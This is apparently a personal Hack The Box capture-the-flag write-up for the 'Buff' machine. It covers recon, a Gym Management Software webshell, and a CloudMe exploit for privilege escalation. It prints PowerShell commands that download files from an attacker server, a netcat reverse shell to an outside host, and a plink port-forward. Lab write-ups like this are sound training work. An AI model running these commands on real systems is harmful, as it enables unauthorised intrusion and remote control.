# Hack The Box - Buff (machine)

## Initial recon

Let's start by gathering some basic info. Looking at the machine's profile on HTB, I can see it's on ip address `10.10.10.198`, so let's try to see what ports are open there using `nmap`:
```
$ nmap -sC -sV 10.10.10.198
	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 07:41 EST
	Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
	Nmap done: 1 IP address (0 hosts up) scanned in 4.16 seconds
```
Ok, not much information there, let's try following `nmap`'s suggestion:
```
$ nmap -sC -sV -Pn 10.10.10.198
	Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 07:43 EST
	Nmap scan report for 10.10.10.198
	Host is up (0.37s latency).
	Not shown: 999 filtered ports
	PORT     STATE SERVICE VERSION
	8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
	|_http-open-proxy: Proxy might be redirecting requests
	|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
	|_http-title: mrb3n's Bro Hut
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 58.63 seconds
```
After waiting for some time we can see the machine has a http server listening on port `8080`, unfortunately there's no `ssh` or anything, so let's see what we can do. One thing I'll do in the background while I manually explore the website is run gobuster like so: `gobuster -w dirbuster-directory-list-2.3-medium.txt dir -u http://10.10.10.198:8080/` in case it finds anything useful. 

While `gobuster` does it's thing, let's continue to explore the website: asking for both `/robots.txt` and `/sitemap.xml` results in `404`, so we're left with randomly clicking links and hoping for the best. Luckily, we find one small legend at the bottom of the 'about' page: `Made with Gym Management Software 1.0`. Of course we already knew the versions of apache, PHP and so son, but a quick search online did not get us any useful vulnerabilities, so maybe let's try searching for this one. And indeed, we find many useful vulnerabilites, after some reading and some trial and error I settled for [this one](https://www.exploit-db.com/exploits/48506), which should provide us with a webshell.

## Gaining a foothold

To begin with, the exploit previously linked was made with python 2, so let's port it to python 3 as it doesn't seem to work out of the box (the changes needed are very minor anyways). As promissed, we do get shell, although not a very comfortable one (can't see errors, can't `cd` out of the directory, etc.). At this stage we will need to send files to the victim machine, so let's fire up a http server with python so that we can download needed files from our machine. Let's start by sending `nc.exe`, we'll be listening for a connection on port 1234 and once netcat is downloaded on the victim machine we'll connect to it. All of this we'll do as follows:

- On our host:
```
$ nc -lvp 1234
```

- On the victim: 
```
> powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://myServer/nc.exe', 'nc.exe')
> nc.exe -nv myHost 1234 -e cmd.exe
```

And done, we now have command line via netcat and we're logged in as a local user:

```
> whoami
	buff\shaun
```

and of course we can navigate to the user's desktop directory to get the user's hash and notify HTB that we owned the user.

## Privilege escalation

Now that we're inside, we should start looking for ways to get administrator privileges. First, let's gather some system info (which we can do with the `systeminfo` command):

```
> systeminfo
	Host Name:                 BUFF
	OS Name:                   Microsoft Windows 10 Enterprise
	OS Version:                10.0.17134 N/A Build 17134
	OS Manufacturer:           Microsoft Corporation
	OS Configuration:          Standalone Workstation
	OS Build Type:             Multiprocessor Free
	Registered Owner:          shaun
[...]
```

and also the available users:
```
> net user
	User accounts for \\BUFF
	
	-------------------------------------------------------------------------------
	Administrator            DefaultAccount           Guest                    
	shaun                    WDAGUtilityAccount       
	The command completed successfully.
```

So we have the version of windows (10.0.17134 a.k.a. 1803) and we know we're the only non-privileged user on the system. This is the point where I got stuck for so much more time than I'd like to admit searching for windows exploits which could be of use in this machine, and found some very intereseting interesintg results: [like](https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e) [these](https://www.opswat.com/blog/privilege-escalation-to-system-user-on-windows-10-using-cve-2019-1405-and-cve-2019-1322) (two separate links there), but couldn't get them to work for various reasons. After banging my head against the wall for a (not so little) while, I noticed a suspicious looking file: `C:\Users\shaun\Donwloads\CloudMe_1112.exe`, which I had seen at first and didn't give it much thought, but after a quick search I've found it was [actually pretty important](https://www.exploit-db.com/exploits/48389). Of course this exploit requires some tweaking as well, but it basically lets us run any arbitrary code (such as a reverse shell) on the machine with administrative privileges. Given that we want the exploit to trigger a remote shell, from now on when running the exploit we'll have to make sure we're listening on the specified port like so: `nc -lvp 4321`.

The exploit for `CloudMe` involves sending a malicious payload to the service, but that service isn't being exposed to the outside world, so we've got two options:
- Use `plink.exe` to forward a port through ssh on our machine to the victim and run the exploit locally on the attacker's side
- Somehow get the script to run on the victim machine

### Using plink

Let's quickly try out the first one (seems easier to send on file than the whole of python to the machine). We need to download `plink.exe` using the aforementioned method and do something like `plink.exe -l userName -pw password -P port -N -R myHost:myport:127.0.0.1:8888 myHost` (both `myHost` and `myPort` refer to the attacker's IP and the desired port on the attacker's machine as well), it's important to note that `CloudMe` will be listening on port `8888` on the victim's side, and also that HTB blocks outbound connections to port `22` from these machines for security reasons, so chaning the ssh port is required (though probably a bad idea). This process seemed to work when 'forwarding' the `8080` port to test if it was working (i.e. running the previous command but with port 8080 allows us to see the victim's webpage by typing `localhost:myport` on our web browser), but for some reason it didn't work when running the exploit. So let's put this method on hold for a while and try out the other one.

### Using python

Much to my surprise, getting python to run on the victim machine is actually pretty easy, given the existence of [python's embeddable zip file](https://www.python.org/ftp/python/3.9.0/python-3.9.0-embed-amd64.zip). So we just need to send the python zip, the exploit script and unpack python using:
```
> powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://myServer/python.zip', 'python.zip')
> powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://myServer/script.py', 'script.py')
> powershell -command "Expand-Archive python.zip"
> python\python script.py
```
After runnning the exploit locally I got: `ConnectionRefusedError: [WinError 10061] No connection could be made because the target machine actively refused it`, so it seems the forwarding with `plink.exe` from the previous exploit might have been working after all, and the problem could have been laying somewhere else.

After some retries, and running the script again a few times, I finally managed to get a shell with administrative privileges.

```
> whoami
	buff\administrator
```

Thas means we can finally move to the administrator's desktop and get the root hash!
